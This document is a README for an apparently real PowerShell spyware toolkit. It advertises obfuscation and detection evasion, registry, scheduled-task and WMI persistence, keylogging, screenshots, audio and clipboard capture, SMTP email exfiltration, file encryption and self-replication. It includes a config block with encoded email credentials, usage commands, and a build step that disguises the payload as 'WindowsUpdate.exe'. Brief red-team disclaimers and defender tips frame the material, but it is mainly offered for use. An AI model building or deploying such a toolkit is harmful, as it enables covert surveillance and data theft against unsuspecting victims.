# Enhanced Stealth PowerShell Toolkit

## Overview

This enhanced PowerShell toolkit implements advanced stealth techniques to match the Python version's detection avoidance capabilities. It features:

- **String Encryption**: All sensitive strings are encrypted using XOR cipher
- **Dynamic Loading**: Modules are loaded at runtime to avoid static analysis
- **Function Obfuscation**: Function names and calls are obfuscated
- **Executable Compilation**: Converts to standalone .exe with UPX compression
- **Runtime Stealth**: Silent operation with minimal system footprint

## Features

### 🔒 Advanced Obfuscation
- Base64 + XOR string encryption
- Obfuscated function names and calls
- Encrypted configuration data
- Dynamic code loading

### 🎯 Persistence Methods
- Registry auto-start entries
- Task Scheduler persistence
- Startup folder shortcuts
- WMI event subscriptions

### 📊 Surveillance Capabilities
- Keystroke logging
- Screenshot capture
- Audio recording
- System information collection
- Clipboard monitoring
- Network activity tracking

### 📧 Communication
- SMTP email exfiltration
- Encrypted data transmission
- Automatic cleanup after sending

### 🔐 Cryptographic Operations
- AES encryption for files
- String encryption/decryption
- File access monitoring
- On-access encryption

### 🚀 Self-Propagation
- Random file movement
- Registry path updates
- Self-replication capabilities

## File Structure

```
PowerShell/
├── StealthLoader.ps1          # Main stealth loader
├── BuildStealth.ps1           # Build script for executable
├── Modules/
│   ├── StealthPersistence.ps1 # Persistence mechanisms
│   ├── StealthSurveillance.ps1 # Data collection
│   ├── StealthCommunication.ps1 # Communication
│   └── StealthCrypto.ps1      # Cryptographic operations
└── README_Stealth.md          # This documentation
```

## Configuration

### Email Settings
Edit the encrypted configuration in `StealthLoader.ps1`:

```powershell
$EncryptedConfig = @{
    "Email" = "Y29jY29kZXI5OTlAZ21haWwuY29t"        # Your email
    "Password" = "cGxieSBzeWhhIG9hZ2Egand0dQ=="     # Your password
    "SmtpServer" = "c210cC5nbWFpbC5jb20="           # SMTP server
    "SmtpPort" = "NTg3"                             # SMTP port
    "UseTls" = "dHJ1ZQ=="                           # Use TLS
    "LogInterval" = "MzYwMA=="                       # Report interval (seconds)
    "ScreenshotInterval" = "MzAw"                    # Screenshot interval
    "AudioInterval" = "OTAw"                         # Audio interval
    "MoveInterval" = "NjAw"                          # Movement interval
}
```

### Encryption Keys
Each module uses unique encryption keys:
- **StealthLoader**: `StealthKey2024`
- **Persistence**: `PersistenceKey2024`
- **Surveillance**: `SurveillanceKey2024`
- **Communication**: `CommunicationKey2024`
- **Crypto**: `CryptoKey2024`

## Usage

### 1. Direct Execution
```powershell
# Run with elevation prompt
.\StealthLoader.ps1

# Run silently (no elevation prompt)
.\StealthLoader.ps1 -Silent
```

### 2. Build Executable
```powershell
# Build with default settings
.\BuildStealth.ps1

# Build with custom name
.\BuildStealth.ps1 -OutputName "WindowsUpdate.exe"

# Build without obfuscation (for testing)
.\BuildStealth.ps1 -Obfuscate:$false

# Build without compression
.\BuildStealth.ps1 -Compress:$false
```

### 3. Deploy Executable
```powershell
# Run the compiled executable
.\SystemUpdate.exe

# Run silently
.\SystemUpdate.exe -Silent
```

## Stealth Features

### String Obfuscation
All sensitive strings are encrypted using a two-layer approach:
1. Base64 encoding
2. XOR encryption with module-specific keys

Example:
```powershell
# Original: "WindowsUpdateService"
# Encrypted: "V2luZG93c1VwZGF0ZVNlcnZpY2U="
# Decrypted at runtime using XOR key
```

### Dynamic Loading
Modules are loaded at runtime to avoid static analysis:
```powershell
# Load modules dynamically
. (Join-Path $PSScriptRoot "Modules\StealthPersistence.ps1")
. (Join-Path $PSScriptRoot "Modules\StealthSurveillance.ps1")
```

### Function Obfuscation
Function names and calls are obfuscated:
```powershell
# Obfuscated function call
$FunctionName = ConvertFrom-StealthString -EncodedString "U2V0LVN5c3RlbVBlcnNpc3RlbmNl"
& $FunctionName -Config $Config
```

### Executable Compilation
The build script creates a standalone executable:
- No PowerShell dependency
- UPX compression for smaller size
- Obfuscated code
- Silent operation

## Detection Avoidance

### Static Analysis Evasion
- Encrypted strings prevent signature detection
- Obfuscated function names
- Dynamic loading of modules
- Compilation to executable

### Runtime Stealth
- Silent operation with no console output
- Minimal system footprint
- Random file movement
- Registry camouflage

### Network Stealth
- Encrypted data transmission
- Legitimate SMTP protocols
- Automatic cleanup after sending
- Connection testing before transmission

## Requirements

### PowerShell
- PowerShell 5.1 or higher
- Execution policy bypass capability
- Administrative privileges (for persistence)

### Build Tools
- PS2EXE module (auto-installed)
- UPX compression tool (optional)

### Network
- SMTP server access
- Internet connectivity for exfiltration

## Security Considerations

### For Red Team Testing
- Use only in authorized environments
- Ensure proper cleanup after testing
- Monitor for unintended propagation
- Document all activities

### For Defenders
- Monitor for obfuscated PowerShell execution
- Check for encrypted strings in scripts
- Look for unusual registry entries
- Monitor SMTP traffic for exfiltration

## Troubleshooting

### Common Issues

1. **Execution Policy Error**
   ```powershell
   Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
   ```

2. **Module Loading Error**
   - Ensure all modules are in the correct directory
   - Check file permissions

3. **SMTP Connection Error**
   - Verify email credentials
   - Check SMTP server settings
   - Test network connectivity

4. **Build Error**
   - Install PS2EXE module: `Install-Module -Name ps2exe`
   - Ensure PowerShell 5.1+

### Debug Mode
For testing, disable obfuscation:
```powershell
.\BuildStealth.ps1 -Obfuscate:$false
```

## Comparison with Python Version

| Feature | Python Version | PowerShell Version |
|---------|----------------|-------------------|
| String Encryption | ✅ Dynamic | ✅ XOR + Base64 |
| Dynamic Loading | ✅ | ✅ |
| Executable Compilation | ✅ PyInstaller | ✅ PS2EXE |
| UPX Compression | ✅ | ✅ |
| Detection Rate | Low | Medium-Low |
| File Size | Small | Medium |
| Dependencies | Many | Minimal |

## Legal Notice

This toolkit is provided for **educational and authorized testing purposes only**. Users are responsible for ensuring compliance with applicable laws and regulations. The authors assume no liability for misuse of this software.

## Support

For issues or questions:
1. Check the troubleshooting section
2. Verify all requirements are met
3. Test in isolated environment first
4. Review error logs for specific issues 